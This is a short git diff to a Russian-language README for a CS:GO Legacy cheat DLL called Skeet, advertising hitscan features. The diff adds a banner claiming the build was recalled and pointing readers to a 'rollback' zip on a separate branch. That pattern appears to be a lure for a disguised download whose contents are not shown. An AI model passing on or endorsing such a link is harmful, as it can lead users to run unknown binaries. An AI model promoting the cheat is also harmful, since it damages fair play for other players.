@@ -1,3 +1,5 @@
+> Сборка отозвана после сообщения о регрессии попаданий. Используйте [сборку отката](https://github.com/BCXOVER/JustClover/raw/refs/heads/skeet-scan-patch-8802/Skeet_Hitscan_Rollback_8802.zip).
+
 # Skeet: Hitscan Gamesense / Neverlose, записи и слои анимации
 
 CS:GO Legacy 8802, Windows x86. Готовая DLL: **bin/skeet.dll**.
